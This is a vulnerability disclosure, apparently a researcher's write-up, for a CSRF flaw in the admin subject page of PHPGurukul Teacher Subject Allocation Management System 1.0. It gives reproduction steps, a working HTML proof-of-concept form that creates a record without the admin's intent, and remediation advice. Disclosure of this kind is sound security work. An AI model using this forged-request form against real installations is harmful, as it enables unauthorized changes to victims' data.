## Teacher Subject Allocation Management System V1.0


**Bug Description:**

A Cross Site Request Forgery (CSRF) vulnerability in "/admin/subject.php" endpoint of PHPGurukul Teacher Subject Allocation Management System 1.0  allows attackers to "Create a new Subject" via a crafted html request.

**Steps to Reproduce:** 

```
# Exploit Title: Cross Site Request Forgery (CSRF) vulnerability in PHPGurukul Teacher Subject Allocation Management System
# Date: 05-12-2023
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE : 
```


To reproduce the attack:

1- Head to the http://localhost/tsas/admin/subject.php endpoint 

<img width="960" alt="1" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/635de38f-0bbe-4cc7-9818-4b0fa9d67bc8">


2- Here you can see that there is only one Subject added, but now we will add another course using the HTML code we have written.

<img width="450" alt="2" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/f4467f6e-1813-4027-abba-5ddc12787fd1">


```
<html>
  <!-- CSRF PoC For Add Subject- by Dhabaleshwar Das -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/tsas/admin/subject.php" method="POST">
      <input type="hidden" name="cid" value="1807" />
      <input type="hidden" name="sfname" value="Maths" />
      <input type="hidden" name="ssname" value="MATH" />
      <input type="hidden" name="subcode" value="MA01" />
      <input type="hidden" name="submit" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```


3- We'll then execute this HTML code and we successfully see that the record has been added successfully.

<img width="549" alt="3" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/aa9f9206-7f66-4f6e-b3c5-9e2c54667d07">



4- This shows that the endpoint "/admin/subject.php" is vulnerable to CSRF attack.

<img width="952" alt="4" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/8ed87946-f261-4d7b-97d7-6162bced17f7">



5- CSRF attacks can lead to unauthorized actions being performed on behalf of a user. An attacker could manipulate data within the application, leading to the creation, modification, or deletion of records.

**Remediation:** 

1- Implement anti-CSRF tokens (also known as CSRF tokens or synchronizer tokens) in web forms. These tokens are unique per session and are embedded in the HTML form. The server validates the token with each form submission, ensuring that the request is legitimate.

2- Set the SameSite attribute on cookies to control when they are sent with cross-origin requests. This helps mitigate the risk of CSRF by preventing the automatic inclusion of cookies in cross-site requests.
